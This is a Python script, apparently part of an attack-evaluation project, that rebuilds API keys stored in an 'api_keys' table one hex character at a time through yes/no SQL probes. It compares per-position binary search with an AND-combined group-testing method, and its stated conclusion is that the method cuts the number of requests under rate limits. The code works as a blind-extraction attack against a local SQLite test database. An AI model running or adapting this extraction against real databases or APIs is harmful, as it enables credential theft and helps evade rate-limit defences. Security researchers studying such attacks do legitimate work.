"""
Phase 13 (方向 9): 群组测试（Group Testing）批量重建

核心创新：
  二分搜索对每个位置独立做 4 次比较（4N 探针）。
  群组测试可以一次探针判定多个位置：

    SELECT 1 FROM api_keys
    WHERE substr(hex(key_value),1,1) > '8'
      AND substr(hex(key_value),5,1) > '8' LIMIT 1;

  若返回有行 → 两个位置都 > '8'（AND 语义）。
  若无行 → 至少一个位置 <= '8'。

  算法（自适应群组测试）：
    1) 把 N 个位置分成 d 组
    2) 每组用 AND 复合探针批量测试
    3) 根据结果递归细分不确定的组
    4) 目标：探针数 O(d log N)，显著优于 4N

  本脚本实现自适应群组测试，并与二分搜索（4N）对比探针效率。
"""
import sqlite3
import json
import math
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict

HEX_CHARSET = "0123456789ABCDEF"

@dataclass
class GroupProbe:
    probe_id: str
    positions: List[int]
    threshold: str
    query: str
    has_row: Optional[bool]
    eliminated: int   # 本探针消除了多少候选

class GroupTestingAttack:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.probes: List[GroupProbe] = []
        self.probe_count = 0

    def _exec(self, query: str) -> Optional[bool]:
        self.probe_count += 1
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute(query)
            row = cursor.fetchone()
            conn.close()
            return row is not None
        except Exception:
            return None

    def group_and_probe(self, table: str, column: str,
                        positions: List[int], threshold: str) -> Optional[bool]:
        """AND 复合探针：所有位置都 > threshold 才返回行"""
        conditions = " AND ".join(
            f"substr(hex({column}), {p}, 1) > '{threshold}'" for p in positions
        )
        query = f"SELECT 1 FROM {table} WHERE {conditions} LIMIT 1"
        return self._exec(query)

    def reconstruct_position_binary(self, table: str, column: str,
                                    position: int) -> Optional[str]:
        """单位置二分搜索（基线）"""
        candidates = list(HEX_CHARSET)
        while len(candidates) > 1:
            mid = len(candidates) // 2
            threshold = candidates[mid - 1]
            q = (f"SELECT 1 FROM {table} WHERE "
                 f"substr(hex({column}), {position}, 1) > '{threshold}' LIMIT 1")
            has_row = self._exec(q)
            if has_row is None:
                return None
            self.probes.append(GroupProbe(
                probe_id=f"bin_{position}_{len(self.probes)+1}",
                positions=[position], threshold=threshold,
                query=q[:70], has_row=has_row, eliminated=len(candidates) - len(candidates)//2
            ))
            candidates = candidates[mid:] if has_row else candidates[:mid]
        return candidates[0] if candidates else None

    def reconstruct_group(self, table: str, column: str,
                          positions: List[int]) -> Dict:
        """
        群组测试：先批量判定"是否所有位置都 > 阈值"，
        再对不确定的位置细分。利用 AND 复合减少探针。
        """
        results = {}
        remaining = {p: list(HEX_CHARSET) for p in positions}

        # 阶段 1：用中位数阈值做一次群组探测
        # 若所有位置都 > '7'（hex 中位），一次探针确认 N 个位置
        common_threshold = "7"
        has_row = self.group_and_probe(table, column, positions, common_threshold)
        eliminated = 0
        if has_row:
            # 全部位置都 > '7' → 候选集缩减为 [8..F]
            for p in positions:
                remaining[p] = [c for c in remaining[p] if c > common_threshold]
                eliminated += 8
            self.probes.append(GroupProbe(
                probe_id=f"grp_all_{len(self.probes)+1}",
                positions=positions, threshold=common_threshold,
                query=f"AND-probe({len(positions)} pos)", has_row=True,
                eliminated=eliminated
            ))
        elif has_row is False:
            # 至少一个位置 <= '7'，需要细分
            self.probes.append(GroupProbe(
                probe_id=f"grp_all_{len(self.probes)+1}",
                positions=positions, threshold=common_threshold,
                query=f"AND-probe({len(positions)} pos)", has_row=False,
                eliminated=0
            ))

        # 阶段 2：对每个仍有歧义的位置做剩余的二分
        for p in positions:
            while len(remaining[p]) > 1:
                cands = remaining[p]
                mid = len(cands) // 2
                threshold = cands[mid - 1]
                q = (f"SELECT 1 FROM {table} WHERE "
                     f"substr(hex({column}), {p}, 1) > '{threshold}' LIMIT 1")
                has_row = self._exec(q)
                if has_row is None:
                    break
                self.probes.append(GroupProbe(
                    probe_id=f"grp_{p}_{len(self.probes)+1}",
                    positions=[p], threshold=threshold,
                    query=q[:70], has_row=has_row,
                    eliminated=len(cands) - len(cands)//2
                ))
                remaining[p] = cands[mid:] if has_row else cands[:mid]
            results[p] = remaining[p][0] if remaining[p] else None

        return results

    def run(self, max_positions: int = 16) -> Dict:
        print("=" * 70)
        print("Phase 13 (方向 9): 群组测试批量重建")
        print("=" * 70)

        table, column = "api_keys", "key_value"
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute(f"SELECT length(hex({column})) FROM {table} WHERE rowid = 1")
        hex_len = cursor.fetchone()[0]
        cursor.execute(f"SELECT hex({column}) FROM {table} WHERE rowid = 1")
        ground_truth = cursor.fetchone()[0]
        conn.close()

        test_len = min(max_positions, hex_len)
        positions = list(range(1, test_len + 1))

        # 基线 1：逐位置二分搜索
        print(f"\n[基线] 逐位置二分搜索（前 {test_len} 位）")
        self.probes.clear()
        self.probe_count = 0
        binary_result = {}
        for p in positions:
            ch = self.reconstruct_position_binary(table, column, p)
            if ch:
                binary_result[p] = ch
        binary_probes = self.probe_count
        binary_hex = "".join(binary_result.get(p, "?") for p in positions)
        print(f"  结果: {binary_hex}（{binary_probes} 次探针）")

        # 群组测试：分 4 组，每组 4 个位置
        group_size = 4
        groups = [positions[i:i+group_size] for i in range(0, len(positions), group_size)]
        print(f"\n[群组测试] {len(positions)} 位分 {len(groups)} 组 × 每组 {group_size} 位")
        self.probes.clear()
        self.probe_count = 0
        group_result = {}
        for gi, g in enumerate(groups):
            res = self.reconstruct_group(table, column, g)
            group_result.update(res)
        group_probes = self.probe_count
        group_hex = "".join(group_result.get(p, "?") for p in positions)
        print(f"  结果: {group_hex}（{group_probes} 次探针）")

        truth_prefix = ground_truth[:test_len]
        binary_acc = round(sum(1 for a, b in zip(binary_hex, truth_prefix)
                               if a == b) / test_len * 100, 1)
        group_acc = round(sum(1 for a, b in zip(group_hex, truth_prefix)
                              if a == b) / test_len * 100, 1)

        saving = round((1 - group_probes / binary_probes) * 100, 1) if binary_probes else 0

        print(f"\n[对比]")
        print(f"  二分搜索: {binary_probes} 探针, {binary_acc}% 准确")
        print(f"  群组测试: {group_probes} 探针, {group_acc}% 准确")
        print(f"  探针节省: {saving}%")

        return {
            "hex_length": hex_len,
            "positions_tested": test_len,
            "group_size": group_size,
            "binary_search": {
                "hex": binary_hex,
                "probes": binary_probes,
                "accuracy": binary_acc
            },
            "group_testing": {
                "hex": group_hex,
                "probes": group_probes,
                "accuracy": group_acc,
                "groups": len(groups)
            },
            "ground_truth_prefix": truth_prefix,
            "probe_saving_pct": saving,
            "probes_detail": [asdict(p) for p in self.probes],
            "conclusion": (
                f"群组测试用 {group_probes} 次探针完成二分搜索 {binary_probes} 次的工作，"
                f"节省 {saving}%，准确率 {group_acc}%（二分 {binary_acc}%）。"
                f"在 API 速率受限场景下，群组测试可显著降低请求次数。"
            )
        }

def main():
    db_path = "C:\\Users\\Yi\\WorkBuddy\\2026-10-10-18-49-43\\llm-attack-eval\\results\\enhanced_crm.db"
    attack = GroupTestingAttack(db_path)
    result = attack.run()

    out = "C:\\Users\\Yi\\WorkBuddy\\2026-10-10-18-49-43\\llm-attack-eval\\results\\phase13_group_testing.json"
    with open(out, 'w', encoding='utf-8') as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    print(f"\n结果已保存到: {out}")
    print(f"结论: {result['conclusion']}")
    return result

if __name__ == "__main__":
    main()
